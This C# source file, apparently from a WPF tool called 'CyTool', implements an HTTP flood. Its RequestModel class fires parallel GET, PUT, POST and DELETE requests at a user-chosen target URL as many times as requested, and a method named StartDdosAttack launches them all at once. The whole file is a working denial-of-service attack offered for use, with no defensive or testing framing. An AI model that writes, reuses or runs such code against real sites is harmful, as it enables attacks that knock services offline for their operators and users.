using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Documents;

namespace CyTool.Models
{
    public class RequestModel
    {
        public string TargetUrl { get; set; }
        public int Count { get; set; }
        public ObservableCollection<string> RequestLogs { get; set; } = new ObservableCollection<string>();
        private static readonly HttpClient client = new HttpClient(); // Singleton HttpClient

        public List<Task> PrepareAttack()
        {

            if (string.IsNullOrEmpty(TargetUrl))
                throw new InvalidOperationException("Target URL is required.");



            var attacks = new List<Task>();
           
            Parallel.ForEach(Enumerable.Range(0, Count), i =>
            {
                try { 
                var attackGet = Task.Run(async () =>
                {
                    try
                    {
                        await client.GetAsync(TargetUrl);
                    }
                    catch (Exception ex)
                    {
                        await Application.Current.Dispatcher.InvokeAsync(() =>
                        {
                            RequestLogs.Add($"GET failed {TargetUrl}");
                        });
                    }
                    await Application.Current.Dispatcher.InvokeAsync(() =>
                    {
                        RequestLogs.Add($"GET request sent to {TargetUrl}");
                    });
                });
                if (attackGet != null)
                    attacks.Add(attackGet);

                var attackPut = Task.Run(async () =>
                {
                    try { 
                    await client.PutAsync(TargetUrl, new StringContent(""));
                    }
                    catch (Exception ex)
                    {
                        await Application.Current.Dispatcher.InvokeAsync(() =>
                        {
                            RequestLogs.Add($"PUT failed {TargetUrl}");
                        });
                    }
                    await Application.Current.Dispatcher.InvokeAsync(() =>
                    {
                        RequestLogs.Add($"PUT request sent to {TargetUrl}");
                    });
                });
                if (attackPut != null)
                    attacks.Add(attackPut);

                var attackPost = Task.Run(async () =>
                {
                    try { 
                    await client.PostAsync(TargetUrl, new StringContent(""));
                    }
                    catch (Exception ex)
                    {
                        await Application.Current.Dispatcher.InvokeAsync(() =>
                        {
                            RequestLogs.Add($"POST failed {TargetUrl}");
                        });
                    }
                    await Application.Current.Dispatcher.InvokeAsync(() =>
                    {
                        RequestLogs.Add($"POST request sent to {TargetUrl}");
                    });
                });
                if (attackPost != null)
                    attacks.Add(attackPost);

                var attackDelete = Task.Run(async () =>
                {
                    try { 
                    await client.DeleteAsync(TargetUrl);
                    }
                    catch (Exception ex)
                    {
                        await Application.Current.Dispatcher.InvokeAsync(() =>
                        {
                            RequestLogs.Add($"DELETE failed {TargetUrl}");
                        });
                    }

                    await Application.Current.Dispatcher.InvokeAsync(() =>
                    {
                        RequestLogs.Add($"DELETE request sent to {TargetUrl}");
                    });
                });
                    if (attackDelete != null)
                        attacks.Add(attackDelete);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }

            });

            return attacks;
        }

        public async Task StartDdosAttack(List<Task> attacks)
        {
            await Task.WhenAll(attacks);
        }
    }
}
